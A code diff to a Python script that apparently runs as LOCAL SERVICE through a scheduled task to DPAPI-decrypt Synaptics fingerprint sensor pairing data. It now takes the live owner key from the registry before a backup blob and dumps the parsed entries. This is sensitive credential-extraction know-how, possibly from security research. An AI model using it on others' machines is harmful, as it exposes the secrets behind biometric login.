@@ -106,13 +106,30 @@ def grant_localservice(d: str):
 
 
 def do_decrypt(infile: str, outfile: str):
-    """Runs as LOCAL SERVICE (via the scheduled task). Decrypts infile -> outfile."""
+    """Runs as LOCAL SERVICE (via the scheduled task). Decrypts to outfile.
+
+    Prefers the LIVE current owner key from LOCAL SERVICE's own HKCU (freshest, matches the
+    current master key); falls back to the backup blob the orchestrator passed in `infile`.
+    """
     errf = outfile + ".err"
     try:
-        data = open(infile, "rb").read()
-        plain = crypt_unprotect(data)
+        dpapi = None
+        src = "backup-file"
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Synaptics\PairingData") as k:
+                val = bytes(winreg.QueryValueEx(k, SENSOR_ID)[0])
+            if len(val) > 16 and val[16:16 + len(DPAPI_MAGIC)] == DPAPI_MAGIC:
+                dpapi, src = val[16:], "live-registry"
+        except Exception:
+            dpapi = None
+        if dpapi is None:
+            dpapi = open(infile, "rb").read()  # fallback: backup blob from orchestrator
+        plain = crypt_unprotect(dpapi)
         with open(outfile, "wb") as f:
             f.write(plain)
+        with open(outfile + ".src", "w", encoding="utf-8") as f:
+            f.write(src)
     except Exception as e:  # surface to the orchestrator
         with open(errf, "w", encoding="utf-8") as f:
             f.write("%s: %s" % (type(e).__name__, e))
@@ -169,7 +186,12 @@ def orchestrate():
     if plain is None:
         sys.exit("[X] timed out waiting for the decrypt task (no plain.bin / .err).")
 
-    print("[+] decrypted plaintext: %d bytes" % len(plain))
+    src = "backup-file"
+    try:
+        src = open(outb + ".src", encoding="utf-8").read().strip() or src
+    except OSError:
+        pass
+    print("[+] decrypted plaintext: %d bytes (owner key source: %s)" % (len(plain), src))
 
     # 3. parse TagVal + dump
     entries = parse_tagval(plain)
